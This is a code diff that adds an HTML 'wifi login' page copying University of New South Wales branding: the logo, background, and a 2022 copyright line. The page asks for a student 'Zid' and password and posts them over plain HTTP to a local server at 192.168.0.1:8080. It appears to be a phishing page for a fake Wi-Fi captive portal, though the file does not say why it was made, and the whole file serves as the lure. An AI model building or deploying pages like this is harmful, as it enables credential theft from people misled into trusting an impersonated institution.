@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<head>
+    <meta charset="UTF-8">
+    <title>wifi login</title>
+</head>
+<body background = "unswbackground.jpg" center no-repeat;>
+<div style="
+        display: flex;
+        background-color: #ffe600;
+        border:1px solid rgb(210, 210, 210);
+        flex-direction: column;
+        align-content: center;
+        text-align: center;
+        height:430px;
+        width: 370px;
+        padding: 5px;
+        margin-left: 35%;
+        margin-top: 7%;
+        border-radius: 15px;
+    ">
+    <img src="unswico.png" style="margin: 0 auto;width:165px;height:70px;padding-top: 40px">
+    <h2>Wifi login</h2>
+    <form action="http://192.168.0.1:8080/login" target="_blank" style="background-color: #ffe600;">
+        <input 
+            name="id" 
+            id="id" 
+            style="
+                width: 270px;
+                height: 35px;
+                border:1px solid rgb(210, 210, 210);
+                border-radius: 4px;   
+                   " 
+            type="text" 
+            placeholder="Zid">
+        <br><br>
+        <input 
+            name="password" 
+            id="password"  
+            style="
+                height: 35px;
+                width: 270px;
+                border:1px solid rgb(210, 210, 210);
+                border-radius: 4px;   
+                   " 
+            type="password" 
+            placeholder="Password"
+        >
+        <br><br>
+        <div styal="padding: 0 28px">
+            <input type="submit" value="Login" 
+            style="
+                font-size: 12px;
+                width: 270px;
+                height: 35px;
+                line-height: 28px;
+                text-align: center;
+                color: rgb(255, 255, 255);
+                background-color:rgb(29, 135, 242);
+                border-radius: 4px;
+                border: 0;
+            "/>
+        </div>
+        <div styal="
+            background-color:dodgerblue;
+        ">
+            <br>
+            <b>@copyright UNSW 2022</b>
+        </div>
+    </form>
+
+</div>
+</body>
+</html>
